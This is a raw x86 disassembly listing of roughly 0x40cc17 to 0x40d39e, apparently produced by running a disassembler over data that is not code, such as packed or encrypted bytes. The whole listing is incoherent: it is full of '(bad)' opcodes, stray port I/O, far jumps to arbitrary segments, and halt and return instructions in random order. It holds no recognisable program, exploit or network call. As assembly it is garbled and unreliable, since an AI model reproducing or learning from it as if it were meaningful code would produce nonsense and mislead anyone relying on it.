  40cc17:	add    dh,BYTE PTR [edx+0x69b42140]
  40cc1d:	mov    edi,0xfd22e519
  40cc22:	jp     0x40cbef
  40cc24:	adc    dh,BYTE PTR [edx-0x3e]
  40cc27:	ror    BYTE PTR [ebx+0x1bbf6572],cl
  40cc2d:	test   al,0x7f
  40cc2f:	test   DWORD PTR [esi],eax
  40cc31:	dec    eax
  40cc32:	(bad)  
  40cc33:	aas    
  40cc34:	js     0x40cc39
  40cc36:	mov    esp,0xa04272b
  40cc3b:	ja     0x40cbec
  40cc3d:	pop    ss
  40cc3e:	sub    al,0xaf
  40cc40:	imul   edx,DWORD PTR [esi+0x48],0xa
  40cc44:	aaa    
  40cc45:	xor    DWORD PTR [edi],ebx
  40cc47:	pushf  
  40cc48:	ss sbb al,0xd7
  40cc4b:	sbb    bh,BYTE PTR [esi+0x2]
  40cc4e:	jmp    0x6bd564e8
  40cc53:	mov    esi,0x77783d9a
  40cc58:	iret   
  40cc59:	xchg   esp,eax
  40cc5a:	mov    bl,0xb8
  40cc5c:	arpl   WORD PTR [eax-0x39],dx
  40cc5f:	lea    ebx,[edx+0x30ddafcf]
  40cc65:	add    dh,cl
  40cc67:	out    dx,eax
  40cc68:	mov    al,0x97
  40cc6a:	js     0x40cc14
  40cc6c:	cs imul eax,ebp,0x42
  40cc70:	out    dx,eax
  40cc71:	test   BYTE PTR [bp+di+0x15],dl
  40cc75:	mov    ebp,0xc44bd8b
  40cc7a:	lods   al,BYTE PTR ds:[esi]
  40cc7b:	das    
  40cc7c:	ret    0x57e6
  40cc7f:	cs jno 0x40cc54
  40cc82:	cdq    
  40cc83:	push   ss
  40cc84:	jns    0x40cc21
  40cc86:	cs pusha 
  40cc88:	in     eax,dx
  40cc89:	call   0x92c5:0x3c6dde6d
  40cc90:	jo     0x40cd00
  40cc92:	and    al,0xb1
  40cc94:	mov    ebx,0x2f223a85
  40cc99:	shl    BYTE PTR [edi-0x534ceee4],1
  40cc9f:	fs inc edi
  40cca1:	push   ecx
  40cca2:	outs   dx,BYTE PTR ds:[esi]
  40cca3:	cdq    
  40cca4:	mul    edi
  40cca6:	push   ss
  40cca7:	daa    
  40cca8:	mov    al,0x9b
  40ccaa:	(bad)  
  40ccac:	in     al,0x16
  40ccae:	mov    dh,0xe4
  40ccb0:	add    ebx,DWORD PTR [edx]
  40ccb2:	fimul  WORD PTR [ebx]
  40ccb4:	xor    DWORD PTR [esi],0x1064c7a7
  40ccba:	cld    
  40ccbb:	jp     0x40cd26
  40ccbd:	fnsave [eax]
  40ccbf:	stc    
  40ccc0:	mov    esp,0x70831f67
  40ccc5:	fldenv [edx-0x5febe468]
  40cccb:	jno    0x40ccb3
  40cccd:	pop    ebp
  40ccce:	js     0x40ccd2
  40ccd0:	shl    BYTE PTR [eax+0x74],0xad
  40ccd4:	shl    BYTE PTR [eax+0x76b0ab01],cl
  40ccda:	hlt    
  40ccdb:	add    DWORD PTR [eax-0x3b18ce17],0xb7445c0a
  40cce5:	jns    0x40cd14
  40cce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cce9:	bnd jb 0x40cd41
  40ccec:	and    DWORD PTR [edi+ebx*2],esp
  40ccef:	dec    esi
  40ccf0:	ins    DWORD PTR es:[edi],dx
  40ccf1:	or     eax,0x2d938abf
  40ccf6:	shl    DWORD PTR [ebp+0x6c],1
  40ccf9:	(bad)  
  40ccfa:	mov    ebx,0xc657d9c8
  40ccff:	leave  
  40cd00:	and    DWORD PTR [ebx],esi
  40cd02:	sub    BYTE PTR [eax+esi*2+0x22],dl
  40cd06:	jl     0x40cd69
  40cd08:	test   eax,0xb9d58a84
  40cd0d:	cmp    edi,DWORD PTR [edi-0x7e]
  40cd10:	iret   
  40cd11:	and    eax,0xbd6a939a
  40cd16:	xor    esp,DWORD PTR [ecx-0x59a51139]
  40cd1c:	into   
  40cd1d:	(bad)  [ebx+0x5c91f14b]
  40cd23:	bound  edi,QWORD PTR [edx+0x46]
  40cd26:	aas    
  40cd27:	xor    BYTE PTR [eax+0x24],ah
  40cd2a:	test   eax,0x7b8391ee
  40cd2f:	adc    ch,BYTE PTR [ecx]
  40cd31:	into   
  40cd32:	add    al,0xa5
  40cd34:	clc    
  40cd35:	dec    eax
  40cd36:	in     al,dx
  40cd37:	and    al,0x23
  40cd39:	aas    
  40cd3a:	sub    ebp,ecx
  40cd3c:	or     al,0x4
  40cd3e:	js     0x40cd39
  40cd40:	or     ch,dh
  40cd42:	dec    esi
  40cd43:	jmp    0xe134:0x6c2a6c61
  40cd4a:	retf   
  40cd4b:	pop    ebp
  40cd4c:	or     esi,DWORD PTR [ebx+esi*8+0x29e58c50]
  40cd53:	mov    ds:0xc1acd310,al
  40cd58:	or     bh,BYTE PTR [ecx+0xc2d9def]
  40cd5e:	push   edi
  40cd5f:	fs inc ebp
  40cd61:	add    dh,al
  40cd63:	hlt    
  40cd64:	xchg   edi,eax
  40cd65:	les    ecx,FWORD PTR [ebx]
  40cd67:	(bad)  
  40cd68:	ss iret 
  40cd6a:	cli    
  40cd6b:	cmc    
  40cd6c:	mov    ebx,0xc6afecc2
  40cd71:	sbb    dl,ch
  40cd73:	jmp    0x40cd20
  40cd75:	ror    DWORD PTR [edi],0x1b
  40cd78:	push   esp
  40cd79:	sar    BYTE PTR cs:[edx+esi*8],1
  40cd7d:	sub    DWORD PTR [esi-0x27f997d5],ebx
  40cd83:	mov    ch,0x77
  40cd85:	ror    DWORD PTR [ebp+0x38120dc],0x6d
  40cd8c:	sub    eax,0x2503a893
  40cd91:	cld    
  40cd92:	mov    ah,0x71
  40cd94:	cmp    cl,BYTE PTR [ecx-0x1d06eddb]
  40cd9a:	push   edx
  40cd9b:	cld    
  40cd9c:	push   cs
  40cd9d:	scas   al,BYTE PTR es:[edi]
  40cd9e:	hlt    
  40cd9f:	dec    esi
  40cda0:	cmp    BYTE PTR [edx],dh
  40cda2:	sar    DWORD PTR es:[eax+0x66243df3],0x61
  40cdaa:	jl     0x40ce08
  40cdac:	inc    edx
  40cdad:	lods   al,BYTE PTR ds:[esi]
  40cdae:	sub    BYTE PTR [ebx],al
  40cdb0:	xor    esp,edi
  40cdb2:	jecxz  0x40cdb8
  40cdb4:	cmp    ebx,DWORD PTR [ecx]
  40cdb6:	retf   
  40cdb7:	jmp    0x765f85f5
  40cdbc:	cmp    BYTE PTR [esi-0x4a],0xc6
  40cdc0:	xchg   eax,ebp
  40cdc2:	adc    DWORD PTR [edi],ebp
  40cdc4:	push   ebx
  40cdc5:	or     BYTE PTR [ebx+0x56fc2d5e],bh
  40cdcb:	push   esp
  40cdcc:	and    eax,DWORD PTR [esi+ebx*1-0x51]
  40cdd0:	popa   
  40cdd1:	and    BYTE PTR [ebp+0x64],al
  40cdd4:	and    bl,BYTE PTR cs:[ebp-0x576015a4]
  40cddb:	jne    0x40cd7f
  40cddd:	inc    ebx
  40cdde:	in     eax,dx
  40cddf:	retf   0x96c5
  40cde2:	push   cs
  40cde3:	or     eax,0xdbf831e
  40cde8:	not    BYTE PTR [eax-0x44]
  40cdeb:	call   0x949e6e5a
  40cdf0:	stos   BYTE PTR es:[edi],al
  40cdf1:	imul   ecx,ecx,0x20bd667a
  40cdf7:	pop    ecx
  40cdf8:	test   eax,0xda71e31b
  40cdfd:	loope  0x40ce50
  40cdff:	pop    ss
  40ce00:	cmp    ebx,DWORD PTR [ebx]
  40ce02:	(bad)  
  40ce04:	mov    dl,0x42
  40ce06:	fcomip st,st(4)
  40ce08:	pop    edx
  40ce09:	mov    esi,0xb0581f80
  40ce0e:	add    al,0xa5
  40ce10:	mov    gs,WORD PTR [edx]
  40ce12:	add    bh,BYTE PTR [ebp-0x69]
  40ce15:	jmp    0x4a0bf596
  40ce1a:	stos   DWORD PTR es:[edi],eax
  40ce1b:	jnp    0x40ce86
  40ce1d:	mov    DWORD PTR [eax-0x77ae8b84],0x8993ee53
  40ce27:	aas    
  40ce28:	jo     0x40cdfe
  40ce2a:	jno    0x40ce80
  40ce2c:	pop    ecx
  40ce2d:	loopne 0x40ce10
  40ce2f:	stc    
  40ce30:	and    al,0x60
  40ce32:	or     ebp,0x1eed4437
  40ce38:	mov    edi,0xafddcfd7
  40ce3d:	jbe    0x40ce97
  40ce3f:	and    eax,0x8d468d28
  40ce44:	das    
  40ce45:	dec    BYTE PTR [ebp-0x70d36a03]
  40ce4b:	bswap  esp
  40ce4d:	out    dx,al
  40ce4e:	sbb    DWORD PTR [ebx],eax
  40ce50:	jmp    0x40ce89
  40ce52:	or     eax,0x270cb453
  40ce57:	leave  
  40ce58:	divps  xmm6,xmm5
  40ce5b:	jae    0x40cdef
  40ce5d:	mov    bh,0xc6
  40ce5f:	cwde   
  40ce60:	xor    eax,0xfd4a28d0
  40ce65:	fld    TBYTE PTR [ebp-0x6f]
  40ce68:	sbb    ah,ah
  40ce6a:	addr16 push eax
  40ce6c:	jbe    0x40cec3
  40ce6e:	jmp    0x40cec5
  40ce70:	ss mov edx,0x7c51f8b6
  40ce76:	call   0x454:0xc8e5cd8b
  40ce7d:	rol    BYTE PTR [ebx+eax*4-0x736afdf5],1
  40ce84:	jne    0x40cf00
  40ce86:	sbb    al,0x28
  40ce88:	push   edi
  40ce89:	dec    eax
  40ce8a:	xchg   DWORD PTR [ebx-0x1e1a2ded],esp
  40ce90:	and    DWORD PTR [ecx],edi
  40ce92:	rep outs dx,BYTE PTR ds:[esi]
  40ce94:	and    dl,dl
  40ce96:	mov    ch,0xd7
  40ce98:	push   esp
  40ce99:	dec    esi
  40ce9a:	fwait
  40ce9b:	jle    0x40ce77
  40ce9d:	add    eax,0x7b328d12
  40cea2:	and    edx,esp
  40cea4:	repz (bad) 
  40cea6:	(bad)  
  40cea8:	xor    eax,0x6cc231f7
  40cead:	cmp    eax,0x36d5c4f4
  40ceb2:	cmp    eax,DWORD PTR [edx]
  40ceb4:	out    dx,al
  40ceb5:	push   esp
  40ceb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb7:	stos   DWORD PTR es:[edi],eax
  40ceb8:	sahf   
  40ceb9:	call   0xe1aace6d
  40cebe:	cmp    BYTE PTR [ebx+0x5d],bl
  40cec1:	(bad)  
  40cec2:	loope  0x40cf22
  40cec4:	mov    cl,0xdc
  40cec6:	lock addr16 in al,dx
  40cec9:	sbb    dl,BYTE PTR [eax]
  40cecb:	xchg   edi,eax
  40cecc:	mov    ds:0x4af50da3,al
  40ced1:	mov    al,BYTE PTR [ecx]
  40ced3:	and    eax,0xd3a8dcef
  40ced8:	add    eax,0x20d3e19c
  40cedd:	leave  
  40cede:	xor    al,0x5f
  40cee0:	rcl    DWORD PTR [ecx],cl
  40cee2:	lahf   
  40cee3:	cs ja  0x40ce6a
  40cee6:	leave  
  40cee7:	aas    
  40cee8:	pop    ebx
  40cee9:	sub    edx,edx
  40ceeb:	in     eax,0xb8
  40ceed:	(bad)  
  40ceee:	jmp    DWORD PTR [ebp+edx*4+0x7e]
  40cef2:	or     al,0xaf
  40cef4:	imul   esp,DWORD PTR [edi-0x7a],0xffffffa2
  40cef8:	(bad)  
  40cefa:	pop    esp
  40cefb:	sbb    eax,0x7d486694
  40cf00:	stos   DWORD PTR es:[edi],eax
  40cf01:	outs   dx,DWORD PTR ds:[esi]
  40cf02:	jnp    0x40cf68
  40cf04:	mov    ah,0xa8
  40cf06:	pop    ebp
  40cf07:	daa    
  40cf08:	jmp    0x40cf75
  40cf0a:	retf   
  40cf0b:	clc    
  40cf0c:	and    ax,0x3393
  40cf10:	xor    eax,0xf2458361
  40cf16:	loopne 0x40cf0a
  40cf18:	les    ebp,FWORD PTR [ecx]
  40cf1a:	push   eax
  40cf1b:	div    BYTE PTR gs:[edi]
  40cf1e:	or     ebp,DWORD PTR [ebx+0x6e]
  40cf21:	sbb    esp,DWORD PTR [ebp-0x39ba2900]
  40cf27:	(bad)  
  40cf29:	cmp    al,0x5f
  40cf2b:	clc    
  40cf2c:	sub    cl,BYTE PTR [ebx]
  40cf2e:	push   0xe539da52
  40cf33:	popa   
  40cf34:	mov    cl,bl
  40cf36:	mov    eax,ds:0x720390f9
  40cf3b:	in     al,dx
  40cf3c:	in     al,dx
  40cf3d:	dec    ebx
  40cf3e:	out    dx,al
  40cf3f:	int3   
  40cf40:	mov    ebp,0x7308bc40
  40cf45:	das    
  40cf46:	fwait
  40cf47:	jmp    FWORD PTR [esi-0x70]
  40cf4a:	cmc    
  40cf4b:	lods   eax,DWORD PTR ds:[esi]
  40cf4c:	cld    
  40cf4d:	inc    edi
  40cf4e:	pop    ebp
  40cf4f:	cmp    al,0xb4
  40cf51:	mov    ecx,0x93c5e0b5
  40cf56:	xor    ebp,eax
  40cf58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf59:	lods   al,BYTE PTR ds:[esi]
  40cf5a:	in     al,dx
  40cf5b:	push   esp
  40cf5c:	ror    BYTE PTR [ebx-0x5],cl
  40cf5f:	loope  0x40cfd0
  40cf61:	push   eax
  40cf62:	xor    al,0x3b
  40cf64:	mov    dh,0xa1
  40cf66:	pop    edx
  40cf67:	or     al,0x7d
  40cf69:	cmp    DWORD PTR ds:0x945b49e,0xde9a34d3
  40cf73:	add    ch,BYTE PTR [esi]
  40cf75:	mov    ds:0xacda70ad,eax
  40cf7a:	xor    DWORD PTR [ebx-0x7ab3ca61],ebx
  40cf80:	(bad)  
  40cf84:	xor    DWORD PTR [esi+0x370cc61f],edx
  40cf8a:	test   DWORD PTR [edx],ebx
  40cf8c:	repz fs push ds
  40cf8f:	jmp    edx
  40cf91:	sbb    dh,dh
  40cf93:	push   ebp
  40cf94:	fimul  DWORD PTR [eax+eax*2+0x16f2dd9b]
  40cf9b:	mov    eax,es:0x8149f713
  40cfa1:	mov    bl,0x55
  40cfa3:	xchg   DWORD PTR [ebp-0x63],edi
  40cfa6:	xor    ecx,DWORD PTR [edx]
  40cfa8:	xchg   ecx,eax
  40cfa9:	aad    0xa1
  40cfab:	xor    BYTE PTR [ebp-0x43],0x69
  40cfaf:	dec    eax
  40cfb0:	test   al,0x1d
  40cfb2:	bound  ebx,QWORD PTR [ecx+0x30]
  40cfb5:	js     0x40cfe4
  40cfb7:	jae    0x40cfe1
  40cfb9:	mov    edi,0x166ab777
  40cfbe:	not    DWORD PTR [ebp-0x5f]
  40cfc1:	push   ss
  40cfc2:	jle    0x32d228f3
  40cfc8:	pop    es
  40cfc9:	addr16 mov eax,ds:0x7d01
  40cfcd:	push   es
  40cfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfcf:	adc    eax,0x212ce4b9
  40cfd4:	pop    ds
  40cfd5:	pop    esi
  40cfd6:	xchg   ebx,eax
  40cfd7:	ins    BYTE PTR es:[edi],dx
  40cfd8:	test   bh,al
  40cfda:	neg    DWORD PTR [ecx-0x5cb159a1]
  40cfe0:	or     eax,edx
  40cfe2:	xlat   BYTE PTR ds:[ebx]
  40cfe3:	inc    edi
  40cfe4:	scas   eax,DWORD PTR es:[edi]
  40cfe5:	(bad)  
  40cfe6:	jle    0x40cff1
  40cfe8:	clc    
  40cfe9:	xchg   ebp,eax
  40cfea:	push   ebp
  40cfeb:	xor    al,0xae
  40cfed:	jmp    0xd04:0x21939e62
  40cff4:	rol    DWORD PTR [eax-0x98eedfb],cl
  40cffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cffb:	dec    ebp
  40cffc:	dec    esi
  40cffd:	jb     0x40cfcb
  40cfff:	stc    
  40d000:	mov    ecx,0x5e235cc9
  40d005:	sub    DWORD PTR [eax-0x5d],edx
  40d008:	scas   eax,DWORD PTR es:[edi]
  40d009:	sub    ecx,ebx
  40d00b:	test   eax,0x5f408d22
  40d010:	out    dx,al
  40d011:	dec    ebp
  40d012:	adc    al,0xc1
  40d014:	and    DWORD PTR [esi+0x14124f5e],edx
  40d01a:	lods   eax,DWORD PTR ds:[esi]
  40d01b:	cmc    
  40d01c:	pop    eax
  40d01d:	mov    esi,0x95fd1722
  40d022:	call   0xb603:0x1d474b0e
  40d029:	sub    eax,0x3bcf05e9
  40d02e:	jmp    0xc2cdbf80
  40d033:	xor    eax,0xaed2dce5
  40d038:	jbe    0x40d01b
  40d03a:	outs   dx,BYTE PTR ds:[esi]
  40d03b:	or     al,0x1a
  40d03d:	cmp    al,0x63
  40d03f:	sbb    edi,DWORD PTR [edi+0x79a5dde0]
  40d045:	aaa    
  40d046:	enter  0xdb35,0x5a
  40d04a:	pop    ebp
  40d04b:	or     al,0x5e
  40d04d:	mov    dl,0xe1
  40d04f:	xchg   DWORD PTR [eax+0x58c9bafb],esp
  40d055:	adc    BYTE PTR [edx+0x4f],ah
  40d058:	out    dx,al
  40d059:	sub    BYTE PTR [ebp+0x11],dh
  40d05c:	fld    TBYTE PTR [eax-0x62]
  40d05f:	inc    ebx
  40d060:	jp     0x40d028
  40d062:	jae    0x40d0bd
  40d064:	int    0xcb
  40d066:	mov    cl,0x5a
  40d068:	xor    al,BYTE PTR [ebx+0x44]
  40d06b:	cs mov bl,0x40
  40d06e:	push   cs
  40d06f:	and    al,BYTE PTR [ecx]
  40d071:	rcr    DWORD PTR [ebx+0x5d],cl
  40d074:	mov    dh,0x61
  40d076:	lahf   
  40d077:	ins    BYTE PTR es:[edi],dx
  40d078:	push   0xffffff90
  40d07a:	jmp    0x33cfac50
  40d07f:	shl    BYTE PTR [ebp+0x6],1
  40d082:	fld    DWORD PTR [edi+0x6a2c5159]
  40d088:	dec    eax
  40d089:	(bad)  
  40d08a:	cs mov ecx,0x24c0c7bd
  40d090:	cmc    
  40d091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d092:	or     eax,0x77c752e9
  40d097:	or     BYTE PTR [eax],0x89
  40d09a:	mov    DWORD PTR [esi],esi
  40d09c:	loop   0x40d0de
  40d09e:	jge    0x40d07e
  40d0a0:	adc    ecx,esp
  40d0a2:	and    ebp,DWORD PTR fs:[esi-0x58d084d0]
  40d0a9:	inc    BYTE PTR [ebx+0x32]
  40d0ac:	shr    DWORD PTR [ebx-0x74],0xd7
  40d0b0:	pusha  
  40d0b1:	dec    eax
  40d0b2:	cmp    DWORD PTR [eax-0x75],ebx
  40d0b5:	icebp  
  40d0b6:	or     eax,0x27dfe266
  40d0bb:	fcomp  DWORD PTR [edx+0x665fa403]
  40d0c1:	int3   
  40d0c2:	hlt    
  40d0c3:	out    0x32,eax
  40d0c5:	pop    ebx
  40d0c6:	out    dx,eax
  40d0c7:	outs   dx,DWORD PTR ds:[esi]
  40d0c8:	inc    eax
  40d0c9:	pop    edx
  40d0ca:	or     BYTE PTR [edx+0x1f],ah
  40d0cd:	test   al,0x6
  40d0cf:	xchg   edx,eax
  40d0d0:	(bad)
  40d0d4:	dec    ebx
  40d0d5:	or     BYTE PTR [edi+0x68],ch
  40d0d8:	pop    es
  40d0d9:	cwde   
  40d0da:	and    dl,dl
  40d0dc:	inc    ebp
  40d0dd:	push   esp
  40d0de:	fdivr  DWORD PTR [edx+0x12]
  40d0e1:	in     al,dx
  40d0e2:	xor    al,0x3e
  40d0e4:	sub    al,0xe0
  40d0e6:	jecxz  0x40d152
  40d0e8:	in     al,0x18
  40d0ea:	xchg   ah,dh
  40d0ec:	cli    
  40d0ed:	mov    ch,0x87
  40d0ef:	mov    esi,0x95baa107
  40d0f4:	sbb    DWORD PTR [ebx-0x5f245bc5],eax
  40d0fa:	mov    bh,0xa1
  40d0fc:	inc    ecx
  40d0fd:	cmc    
  40d0fe:	rcl    DWORD PTR [esi+edx*4+0x38],cl
  40d102:	jmp    0x40d13a
  40d104:	(bad)  
  40d105:	aad    0x43
  40d107:	inc    esp
  40d108:	(bad)  
  40d109:	dec    ebx
  40d10a:	out    0xaf,al
  40d10c:	xchg   ebp,eax
  40d10d:	out    0x5b,al
  40d10f:	jmp    0x8d97:0xf467f876
  40d116:	pop    esp
  40d117:	(bad)  
  40d118:	out    dx,eax
  40d119:	mov    esp,0x3dfc93d2
  40d11e:	add    DWORD PTR [edx],edx
  40d120:	xor    al,0xbb
  40d122:	jmp    0x40d15a
  40d124:	jmp    0xebf259b2
  40d129:	jp     0x40d19c
  40d12b:	jmp    0x70c976b6
  40d130:	xchg   ebx,eax
  40d131:	out    dx,al
  40d132:	(bad)  
  40d133:	mov    WORD PTR [esi],gs
  40d135:	jp     0x40d0ec
  40d137:	adc    BYTE PTR [ecx+0x36],ch
  40d13a:	test   eax,0xbfd8dc2
  40d13f:	scas   al,BYTE PTR es:[edi]
  40d140:	inc    al
  40d142:	jle    0x40d136
  40d144:	add    DWORD PTR [edx+ecx*1+0x6e43f229],esp
  40d14b:	bound  ebp,QWORD PTR [edx]
  40d14d:	test   al,0x40
  40d14f:	mov    ds:0x5cc63643,eax
  40d154:	mov    al,ds:0xad7e0b10
  40d159:	jle    0x40d199
  40d15b:	sbb    eax,esi
  40d15d:	dec    ecx
  40d15e:	or     BYTE PTR [edx-0x5b],bh
  40d161:	clc    
  40d162:	mov    ds:0x77d44ab0,al
  40d167:	or     DWORD PTR [ebp-0x3d],ebp
  40d16a:	scas   al,BYTE PTR es:[edi]
  40d16b:	out    dx,eax
  40d16c:	mov    edi,0xaff94bd9
  40d171:	cmp    esi,ecx
  40d173:	retf   
  40d174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d175:	dec    ecx
  40d176:	jmp    0x1110:0x84e67d94
  40d17d:	push   cs
  40d17e:	push   edi
  40d17f:	stos   BYTE PTR es:[edi],al
  40d180:	jle    0x40d16a
  40d182:	gs push ss
  40d184:	shr    BYTE PTR [ebx],1
  40d186:	and    ah,BYTE PTR [ecx-0x38]
  40d189:	ja     0x40d196
  40d18b:	test   eax,0xf2b5582
  40d190:	adc    ecx,ecx
  40d192:	inc    esp
  40d193:	push   esp
  40d194:	es inc eax
  40d196:	mov    ch,0xd6
  40d198:	inc    ecx
  40d199:	and    DWORD PTR [ebx-0x53cd3fd8],ecx
  40d19f:	dec    edx
  40d1a0:	in     al,dx
  40d1a1:	mov    eax,ds:0x5162e0c
  40d1a6:	inc    edx
  40d1a7:	lods   al,BYTE PTR ds:[esi]
  40d1a8:	xor    eax,0xb8402c4
  40d1ad:	fwait
  40d1ae:	sub    DWORD PTR [edx+edi*1+0x66],ebp
  40d1b2:	imul   BYTE PTR [edi-0x15537a2b]
  40d1b8:	xlat   BYTE PTR ds:[ebx]
  40d1b9:	popa   
  40d1ba:	adc    dl,BYTE PTR [ebp-0x65dfb453]
  40d1c0:	daa    
  40d1c1:	stos   DWORD PTR es:[edi],eax
  40d1c2:	arpl   WORD PTR [edi-0x176f5bed],cx
  40d1c8:	pop    eax
  40d1c9:	jl     0x40d185
  40d1cb:	test   al,0x94
  40d1cd:	(bad)  
  40d1ce:	jmp    0x40d1a3
  40d1d0:	aam    0x8b
  40d1d2:	sub    DWORD PTR [edx],0xa33c5eee
  40d1d8:	inc    ecx
  40d1d9:	xor    eax,0x85833bc5
  40d1de:	cmp    BYTE PTR [ebp-0x32],cl
  40d1e1:	stc    
  40d1e2:	add    eax,0x8b4027c0
  40d1e7:	or     BYTE PTR [ecx+0x1394da74],cl
  40d1ed:	fst    DWORD PTR [eax+ebp*2]
  40d1f0:	into   
  40d1f1:	dec    esp
  40d1f2:	pop    eax
  40d1f3:	cmp    al,0xcf
  40d1f5:	int3   
  40d1f6:	or     al,0x7f
  40d1f8:	(bad)  [edi]
  40d1fa:	cdq    
  40d1fb:	pop    ebx
  40d1fc:	push   ss
  40d1fd:	sbb    BYTE PTR [edx],dl
  40d1ff:	cmp    eax,0x122e5aa7
  40d204:	jle    0x40d1cf
  40d206:	iret   
  40d207:	bound  ecx,QWORD PTR [esi+0x1a47d67e]
  40d20d:	jno    0x40d1b4
  40d20f:	sti    
  40d210:	ja     0x40d19e
  40d212:	call   0x27723960
  40d217:	push   0xfcc502a6
  40d21c:	mov    eax,0x1be1a633
  40d221:	hlt    
  40d222:	inc    edi
  40d223:	shl    BYTE PTR [ecx+0x14b78c29],1
  40d229:	push   cs
  40d22a:	xor    eax,0x6412d1f7
  40d22f:	dec    esi
  40d230:	mov    ds:0x91b6cfd2,al
  40d235:	push   ebx
  40d236:	fs (bad) 
  40d238:	mov    dh,0x61
  40d23a:	mov    ah,0xa5
  40d23c:	sub    esp,DWORD PTR [edi]
  40d23e:	push   esi
  40d23f:	shr    DWORD PTR [eax+0x3baf075],1
  40d245:	xchg   esi,eax
  40d246:	dec    DWORD PTR [edi+0x52c31649]
  40d24c:	mov    ebx,0xf15b82
  40d251:	jle    0x40d256
  40d253:	out    0x66,eax
  40d255:	icebp  
  40d256:	and    DWORD PTR [ecx],ecx
  40d258:	je     0x40d217
  40d25a:	nop
  40d25b:	fwait
  40d25c:	cli    
  40d25d:	ins    BYTE PTR es:[edi],dx
  40d25e:	mov    ecx,0xbadeac64
  40d263:	cli    
  40d264:	adc    al,bl
  40d266:	in     al,0x32
  40d268:	gs ins BYTE PTR es:[edi],dx
  40d26a:	xor    eax,DWORD PTR [esi-0x22ba2c9b]
  40d270:	sbb    dh,BYTE PTR [edx+0x38]
  40d273:	jg     0x40d2d1
  40d275:	adc    al,BYTE PTR [ecx-0xbaaf96]
  40d27b:	push   ss
  40d27c:	loopne 0x40d203
  40d27e:	stc    
  40d27f:	js     0x40d296
  40d281:	xchg   ebp,eax
  40d282:	test   al,0xd5
  40d284:	jb     0x40d283
  40d286:	daa    
  40d287:	add    bl,BYTE PTR [ebx+0x55]
  40d28a:	adc    al,0x4f
  40d28c:	(bad)  
  40d28e:	or     BYTE PTR [eax+0x7b12e440],al
  40d294:	xor    eax,0x605f05eb
  40d299:	push   ss
  40d29a:	neg    ebp
  40d29c:	and    DWORD PTR [ebp+0xe54b11],eax
  40d2a2:	lods   al,BYTE PTR ds:[esi]
  40d2a3:	cld    
  40d2a4:	(bad)  
  40d2a5:	icebp  
  40d2a6:	enter  0x474e,0x2c
  40d2aa:	jb     0x40d2b0
  40d2ac:	mov    ebx,0x5b57e65d
  40d2b1:	mov    DWORD PTR [ebx-0x61],ebp
  40d2b4:	fstp   TBYTE PTR [esi-0x5f]
  40d2b7:	adc    eax,0x843875c8
  40d2bc:	inc    eax
  40d2bd:	arpl   WORD PTR [esi*4+0x541066a],cx
  40d2c4:	and    BYTE PTR [esi],bh
  40d2c6:	lock enter 0x4816,0xcf
  40d2cb:	daa    
  40d2cc:	fisub  WORD PTR [edx+esi*2+0x65]
  40d2d0:	lods   al,BYTE PTR ds:[esi]
  40d2d1:	fucom  st(4)
  40d2d3:	mov    DWORD PTR fs:[esi+ebp*8],edi
  40d2d7:	fwait
  40d2d8:	mov    ebp,0x1d755939
  40d2dd:	nop
  40d2de:	fs push cs
  40d2e0:	es cmp al,0xf1
  40d2e3:	loopne 0x40d2de
  40d2e5:	les    eax,FWORD PTR [ecx]
  40d2e7:	jae    0x40d2cd
  40d2e9:	lods   al,BYTE PTR ds:[esi]
  40d2ea:	scas   al,BYTE PTR es:[edi]
  40d2eb:	sbb    edi,eax
  40d2ed:	cwde   
  40d2ee:	out    0xd4,al
  40d2f0:	sub    DWORD PTR [esi-0x42d6590f],0xffffffb1
  40d2f7:	inc    ebx
  40d2f8:	add    edi,DWORD PTR [ebx]
  40d2fa:	mov    ds:0xa6a06f2c,al
  40d2ff:	je     0x40d330
  40d301:	cs dec esi
  40d303:	fadd   QWORD PTR [edx-0x431f0eb7]
  40d309:	push   es
  40d30a:	rcl    BYTE PTR [ebp-0x5d],1
  40d30d:	inc    ebx
  40d30e:	ret    
  40d30f:	ret    
  40d310:	mov    cl,0xc3
  40d312:	or     DWORD PTR [ebp-0x7e61c28a],edi
  40d318:	aam    0xe5
  40d31a:	add    ah,BYTE PTR [edi+0x5a]
  40d31d:	sub    eax,0x7c4ce70b
  40d322:	rol    DWORD PTR [edi+ecx*1],1
  40d325:	imul   ecx,DWORD PTR [ecx-0xf4cc9ec],0xffffffe4
  40d32c:	or     al,0x80
  40d32e:	data16 mov cl,0xc6
  40d331:	fisttp QWORD PTR [ebx+eiz*4+0x263db642]
  40d338:	sbb    DWORD PTR [ebp+0x53],ebp
  40d33b:	adc    eax,0x70602374
  40d340:	out    dx,al
  40d341:	adc    eax,0x979179a5
  40d346:	in     eax,0x2d
  40d348:	pop    es
  40d349:	add    dh,dh
  40d34b:	into   
  40d34c:	fdivrp st(4),st
  40d34e:	pop    edx
  40d34f:	push   es
  40d350:	or     BYTE PTR [edi-0x72],cl
  40d353:	push   esi
  40d354:	pop    esp
  40d355:	pop    es
  40d356:	mov    bl,0xca
  40d358:	jcxz   0x40d3bd
  40d35b:	jb     0x40d3b8
  40d35d:	push   ebp
  40d35e:	mov    eax,0x5f620ca1
  40d363:	dec    edi
  40d364:	pop    eax
  40d365:	out    dx,eax
  40d366:	or     ah,ch
  40d368:	(bad)  
  40d369:	pop    esp
  40d36a:	push   ds
  40d36b:	jne    0x40d397
  40d36d:	test   ch,bl
  40d36f:	mov    al,ds:0x63424d75
  40d374:	push   ecx
  40d375:	fcom   QWORD PTR [ebp+0x2f]
  40d378:	and    al,0x45
  40d37a:	xor    edx,esi
  40d37c:	push   edi
  40d37d:	dec    ebp
  40d37e:	cmp    DWORD PTR [eax-0x1a04bfe9],edx
  40d384:	sub    edx,esp
  40d386:	dec    edx
  40d387:	shr    BYTE PTR [esp+ebp*2],0x68
  40d38b:	mov    DWORD PTR [ebp+eiz*8+0x6b2635c8],0xd97fae91
  40d396:	imul   BYTE PTR [edi+ebx*4+0x6b]
  40d39a:	pop    eax
  40d39b:	jge    0x40d344
  40d39d:	into   
  40d39e:	test   BYTE PTR [eax],bl
